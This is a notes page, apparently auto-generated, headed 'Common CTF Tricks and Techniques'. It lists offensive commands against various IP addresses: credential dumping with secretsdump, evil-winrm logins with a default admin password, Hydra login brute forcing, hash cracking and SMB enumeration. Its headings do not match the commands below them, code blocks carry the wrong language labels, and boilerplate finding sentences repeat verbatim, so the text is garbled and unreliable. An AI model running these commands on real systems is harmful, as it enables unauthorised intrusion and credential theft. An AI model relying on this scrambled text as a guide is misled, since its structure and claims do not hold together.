---
TitleSEO: "Common CTF Tricks and Techniques | ZureFX"
TitlePost: "Common CTF Tricks and Techniques"
Author: "ZureFX"
Description: "Personal notes on Common CTF Tricks and Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, privilege escalation, blue team, linux"
URL: "https://zurefx.github.io/notes/note-common-ctf-tricks-and-techniques-488.html"
URL_IMAGES: ""
Date: "2024-08-28"
Tags: "DFIR, Privilege Escalation, Blue Team, Linux"
Section: "notes"
Lang: "en"
main_img: "note-common-ctf-tricks-and-techniques-488"
Permalink: "/notes/note-common-ctf-tricks-and-techniques-488.html"
BtnLabel: "Read Notes"
Pick: 0
---
## metasploit

### rubeus

```bash
evil-winrm -i 10.96.227.124 -u administrator -p 'P@ssw0rd!'
```

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.68.150.66
nmap -sCV -p27017,5986,5432 10.110.155.144 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.99.32 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Writable PATH

### secretsdump

```bash
crackmapexec smb 10.23.127.114 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `Resource-Based Constrained Delegation`
- `XSS`
- `SQL Injection`

## pwncat

### Joomla

```powershell
feroxbuster -h
evil-winrm -i 10.26.28.58 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.117.28.163 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

- `Unquoted Service Path`
- `wpscan`
- `DNS Rebinding`
- `psexec`

## CSRF

### SUID Binary

```python
nmap -sCV -p464,53,53 10.118.206.36 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities.

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.10.153.171
```

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

## POP3

### SeImpersonatePrivilege

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

> **Note:** Silver Ticket was identified as the primary attack vector in this scenario.

- `sharphound`
- `Writable PATH`
- `kerbrute`

```powershell
gobuster dir -u http://10.29.30.52/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `ldapsearch`
- `feroxbuster`
- `burpsuite`
- `Constrained Delegation`
- `Local File Inclusion`
- `Open Redirect`

## Kali Linux

### psexec

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
nmap -sCV -p445,135,993 10.11.92.25 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.36.32 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.85.209.196 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.145.250/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.48.135 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```
